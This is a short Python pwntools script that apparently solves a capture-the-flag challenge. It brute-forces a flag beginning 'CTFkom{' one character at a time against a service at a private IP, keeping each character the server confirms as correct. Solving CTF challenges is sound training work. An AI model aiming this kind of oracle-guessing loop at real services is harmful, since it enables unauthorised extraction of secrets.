from pwn import remote

ip = "10.212.172.46"
port = 2828

charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"

found = "CTFkom{"
while True:
    for c in charset:
        p = remote(ip, port)

        print(p.recv())
        p.sendline(str(len(found) + 1))

        print(p.recv())
        guess = found + c
        p.sendline(guess)

        res = p.recv().decode()
        p.close()

        if "Correct flag :)" in res:
            found += c
            print(found)
            break

    if found.endswith('}'):
        print(found)
        break
